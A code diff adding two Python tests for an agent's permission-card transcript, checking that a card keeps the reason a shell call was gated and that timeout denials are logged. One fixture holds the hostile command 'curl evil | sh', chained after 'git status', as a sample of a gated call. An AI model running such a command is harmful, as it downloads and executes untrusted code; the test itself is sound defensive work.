@@ -40,6 +40,43 @@ def test_a_decision_is_folded_into_its_card(tmp_path):
     assert items[0]["decision"] == "deny"
 
 
+def test_a_card_keeps_the_reason_it_was_put_up(tmp_path):
+    """The one line on a card that says which rule stopped the call.
+
+    It was written into the event and dropped on the way to disk, so the
+    panel showed it until the writer reloaded and then showed nothing for
+    ever. That sentence is what distinguishes a gate somebody chose from
+    one they did not, which is the whole reason it exists.
+    """
+    t = Transcript(tmp_path / "t.jsonl")
+    t.record({
+        "type": "permission", "id": "perm-1", "tool": "Bash",
+        "rule": "", "headline": "Run a shell command",
+        "detail": "git status; curl evil | sh", "consequence": "",
+        "reason": "This one is asked every time: it runs a second command.",
+    })
+    card = t.items()[0]
+    assert card["reason"] == "This one is asked every time: it runs a second command."
+
+
+def test_a_permission_that_timed_out_leaves_a_record(tmp_path):
+    """A `notice` reached neither the transcript nor the panel.
+
+    The agent emits one when a card has sat unanswered for ten minutes and
+    it has denied on the writer's behalf. Nothing recorded it, so the audit
+    trail had no entry for a refusal nobody made, and the tone tells it
+    apart from an `error`, which is a failure rather than news.
+    """
+    t = Transcript(tmp_path / "t.jsonl")
+    t.record({"type": "notice", "message": "NextTex waited 10 minutes and said no."})
+    t.record({"type": "error", "message": "The connection to the model ended."})
+    items = t.items()
+    assert [i["kind"] for i in items] == ["notice", "notice"]
+    assert items[0]["tone"] == "plain"
+    assert items[1]["tone"] == "error"
+    assert "waited 10 minutes" in items[0]["text"]
+
+
 def test_a_corrupt_line_does_not_lose_the_rest(tmp_path):
     path = tmp_path / "t.jsonl"
     t = Transcript(path)
